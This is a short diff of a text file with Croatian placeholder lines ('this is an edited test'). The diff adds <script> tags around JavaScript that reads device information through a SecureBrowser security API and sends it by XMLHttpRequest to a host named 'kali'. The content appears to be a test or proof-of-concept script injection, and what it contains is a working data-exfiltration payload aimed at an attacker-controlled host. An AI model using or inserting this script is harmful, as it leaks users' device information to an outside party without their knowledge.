@@ -1,11 +1,12 @@
 ovo je editirani test
 i drugi red
 
+<script>
 const deviceInfo = function(info){
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://kali/?getDeviceInfo?info=' + info);
     xhr.send();
 }
 SecureBrowser.security.getDeviceInfo(deviceInfo);
-
+</script>
 i ovo je kraj
